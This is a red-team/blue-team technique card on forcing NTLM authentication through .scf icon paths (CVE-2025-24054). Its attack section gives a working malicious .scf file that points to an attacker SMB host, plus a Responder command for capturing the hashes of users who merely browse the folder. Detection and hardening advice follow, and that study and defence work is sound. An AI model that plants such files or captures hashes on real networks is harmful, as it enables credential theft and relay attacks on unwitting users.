# [CA-FORCE-001]: SCF/URL File NTLM Trigger (CVE-2025-24054)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-FORCE-001 |
| **MITRE ATT&CK v18.1** | [Forced Authentication (T1187)](https://attack.mitre.org/techniques/T1187/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **CVE** | **CVE-2025-24054** (and variants like CVE-2024-43451) |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Windows Explorer automatically attempts to resolve icons or paths defined in certain file types (`.scf`, `.url`, `.lnk`). By creating a file that points its "IconLocation" to an attacker-controlled SMB share (`\\attacker\share\icon.ico`), an attacker can force any user who *browses* the folder (even without clicking) to send their NTLMv2 hash to the attacker.
- **Attack Surface:** Shared Drives (SMB), ZIP Downloads.
- **Business Impact:** **Credential Theft**. Capturing hashes for offline cracking or NTLM Relaying.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Write access to a common share.
- **Tools:**
    - [Farmer](https://github.com/mdsecactivebreach/Farmer)
    - [Responder](https://github.com/lgandx/Responder)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Create Malicious File**
Create `@test.scf`:
```ini
[Shell]
Command=2
IconFile=\\10.10.10.10\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

**Step 2: Capture Hash**
Run Responder/Farmer and wait for a user to view the folder.
```bash
responder -I eth0 -v
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Network Monitoring
| Source | Event | Filter Logic |
|---|---|---|
| **Firewall** | `Outbound SMB` | Internal workstations initiating SMB (445) connections to unknown external IPs or non-file-server internal IPs. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Outbound SMB:** Block outbound TCP/445 at the perimeter firewall.
*   **SMB Signing:** Enforce SMB Signing on all workstations to prevent NTLM Relaying of the captured auth.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-PHISH-001]
> **Next Logical Step:** [LAT-CLASSIC-001] (Pass-the-Hash)
